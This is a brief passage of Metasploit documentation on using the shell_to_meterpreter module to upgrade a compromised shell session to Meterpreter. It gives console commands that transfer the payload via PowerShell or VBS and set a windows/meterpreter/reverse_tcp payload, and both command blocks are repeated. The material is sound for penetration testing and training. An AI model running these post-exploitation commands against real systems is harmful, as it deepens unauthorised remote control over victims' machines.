## Upgrading shells to Meterpreter
If you have an existing session, either Meterpreter, an SSH, or a basic command shell - you can open a new Meterpreter session with:
```
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
```

To upgrade the most recently opened session to Meterpreter using the `sessions` command:
```
use multi/manage/shell_to_meterpreter
set SESSION 1
set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
set PLATFORM_OVERRIDE windows
set PSH_ARCH_OVERRIDE x64
```

`
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
`

`
use multi/manage/shell_to_meterpreter
set SESSION 1
set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
set PLATFORM_OVERRIDE windows
set PSH_ARCH_OVERRIDE x64
`

